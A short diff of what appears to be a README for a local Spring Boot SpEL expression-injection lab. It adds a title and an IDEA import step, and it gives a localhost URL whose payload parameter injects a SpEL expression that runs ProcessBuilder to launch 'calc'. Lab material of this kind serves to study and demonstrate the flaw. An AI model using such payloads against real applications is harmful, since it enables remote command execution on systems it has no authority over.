@@ -1,4 +1,6 @@
+SpringBoot SpEL表达式注入漏洞
 IDEA导入
+
 执行http://127.0.0.1:8080/fail2?payload=${new%20java.lang.ProcessBuilder(new%20java.lang.String(new%20byte[]{99,97,108,99})).start()}
 
 
